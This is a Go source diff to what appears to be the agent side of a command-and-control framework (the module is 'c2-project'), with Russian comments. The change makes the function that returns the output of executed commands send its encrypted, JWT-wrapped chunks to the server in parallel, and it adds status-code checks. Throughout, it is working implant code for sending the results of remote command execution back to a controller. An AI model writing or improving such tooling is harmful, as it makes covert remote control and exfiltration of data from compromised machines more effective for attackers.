@@ -11,6 +11,7 @@ import (
 	"c2-project/internal/logger"
 	"c2-project/internal/models"
 	"c2-project/internal/protocol"
+	"context"
 	"crypto/tls"
 	"encoding/json"
 	"fmt"
@@ -21,6 +22,7 @@ import (
 	"strings"
 	"time"
 
+	"golang.org/x/sync/errgroup"
 	"golang.org/x/text/encoding/charmap"
 	"golang.org/x/text/transform"
 )
@@ -272,7 +274,7 @@ func (s *Service) execute(cmd string) (string, error) {
 }
 
 // sendResult - отправляет результат выполнения на сервер.
-// Если результат большой, он разбивается на чанки и отправляется последовательно.
+// Если результат большой, он разбивается на чанки и отправляется ПАРАЛЛЕЛЬНО.
 func (s *Service) sendResult(taskID, output, status string) error {
 	result := map[string]interface{}{
 		"task_id": taskID,
@@ -292,7 +294,7 @@ func (s *Service) sendResult(taskID, output, status string) error {
 		return err
 	}
 
-	// Если данные небольшие — отправляем как есть
+	// Если данные небольшие — отправляем как есть (без чанков)
 	if len(encrypted) <= 1024 {
 		token, err := jwt.Encode(encrypted)
 		if err != nil {
@@ -307,36 +309,47 @@ func (s *Service) sendResult(taskID, output, status string) error {
 		return fmt.Errorf("failed to split data")
 	}
 
-	logger.Debug("Sending chunks", logger.Int("total", len(chunks)))
+	logger.Debug("Sending chunks (parallel)", logger.Int("total", len(chunks)))
 
-	// Отправляем каждый чанк
+	// Отправляем все чанки ПАРАЛЛЕЛЬНО через errgroup.
+	// При первой ошибке контекст отменяется, остальные горутины завершаются.
+	g, _ := errgroup.WithContext(context.Background())
+
 	for i, c := range chunks {
-		chunkData, err := json.Marshal(c)
-		if err != nil {
-			continue
-		}
+		i, c := i, c // для Go < 1.22; безопасно и на новых версиях
 
-		chunkEncrypted, err := crypto.Encrypt(chunkData)
-		if err != nil {
-			continue
-		}
+		g.Go(func() error {
+			chunkData, err := json.Marshal(c)
+			if err != nil {
+				return fmt.Errorf("marshal chunk %d/%d: %w", i+1, len(chunks), err)
+			}
 
-		token, err := jwt.Encode(chunkEncrypted)
-		if err != nil {
-			continue
-		}
+			chunkEncrypted, err := crypto.Encrypt(chunkData)
+			if err != nil {
+				return fmt.Errorf("encrypt chunk %d/%d: %w", i+1, len(chunks), err)
+			}
 
-		if err := s.sendChunk("Bearer " + token); err != nil {
-			logger.Error("Failed to send chunk",
+			token, err := jwt.Encode(chunkEncrypted)
+			if err != nil {
+				return fmt.Errorf("jwt encode chunk %d/%d: %w", i+1, len(chunks), err)
+			}
+
+			if err := s.sendChunk("Bearer " + token); err != nil {
+				return fmt.Errorf("send chunk %d/%d: %w", i+1, len(chunks), err)
+			}
+
+			logger.Debug("Chunk sent",
 				logger.Int("chunk", i+1),
-				logger.Int("total", len(chunks)),
-				logger.Err(err))
-			continue
-		}
-		logger.Debug("Chunk sent", logger.Int("chunk", i+1), logger.Int("total", len(chunks)))
-		time.Sleep(100 * time.Millisecond)
+				logger.Int("total", len(chunks)))
+			return nil
+		})
 	}
 
+	if err := g.Wait(); err != nil {
+		return fmt.Errorf("failed to send chunks: %w", err)
+	}
+
+	logger.Debug("All chunks sent", logger.Int("total", len(chunks)))
 	return nil
 }
 
@@ -354,6 +367,11 @@ func (s *Service) sendChunk(token string) error {
 		return err
 	}
 	defer resp.Body.Close()
+
+	// Проверяем HTTP-статус: 2xx — успех, всё остальное — ошибка.
+	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
+		return fmt.Errorf("server returned status %d", resp.StatusCode)
+	}
 	return nil
 }
 
